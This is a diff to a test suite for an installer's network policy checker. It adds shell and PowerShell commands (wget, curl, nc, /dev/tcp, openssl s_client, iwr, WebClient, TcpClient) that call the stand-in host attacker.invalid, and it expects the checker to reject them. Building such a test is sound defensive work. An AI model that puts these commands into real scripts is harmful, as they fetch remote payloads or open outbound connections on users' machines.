@@ -384,10 +384,16 @@ describe('downloader static safety', () => {
 
     const shellBypasses = [
       'wget "https://attacker.invalid/payload"',
+      `node -e "fetch('https://attacker.invalid/payload')"`,
+      `openssl s_client -connect attacker.invalid:443`,
+      `nc attacker.invalid 443`,
+      `exec 3<>/dev/tcp/attacker.invalid/443`,
       `python3 -c "import urllib.request; urllib.request.urlopen('https://attacker.invalid')"`,
+      `python3 <<'PY'\nimport urllib.request\nurllib.request.urlopen('https://attacker.invalid')\nPY`,
       'curl "$API_URL"; curl "https://attacker.invalid/payload"',
       'curl "$DYNAMIC_URL"',
       'curl "https://attacker.invalid/payload"',
+      'printf "%s\\n" "an appended executable statement"',
     ]
     for (const bypass of shellBypasses) {
       expect(() => verifyInstallerNetworkPolicy(`${shell()}\n${bypass}\n`, powershell()), bypass).toThrow(
@@ -396,14 +402,18 @@ describe('downloader static safety', () => {
     }
 
     const powershellBypasses = [
+      "wget -Uri 'https://attacker.invalid/payload'",
       "iwr -Uri 'https://attacker.invalid/payload'",
       "irm -Uri 'https://attacker.invalid/payload'",
+      "[System.Net.WebRequest]::Create('https://attacker.invalid/payload').GetResponse()",
+      "[System.Net.Sockets.TcpClient]::new('attacker.invalid', 443)",
       "[Net.WebClient]::new().DownloadString('https://attacker.invalid/payload')",
       '[Net.Http.HttpClient]::new()',
       "Start-BitsTransfer -Source 'https://attacker.invalid/payload'",
       "Invoke-WebRequest -Uri $ApiUrl; Invoke-WebRequest -Uri 'https://attacker.invalid/payload'",
       'Invoke-WebRequest -Uri $DynamicUrl',
       "Invoke-WebRequest -Uri 'https://attacker.invalid/payload'",
+      "Write-Output 'an appended executable statement'",
     ]
     for (const bypass of powershellBypasses) {
       expect(() => verifyInstallerNetworkPolicy(shell(), `${powershell()}\n${bypass}\n`), bypass).toThrow(
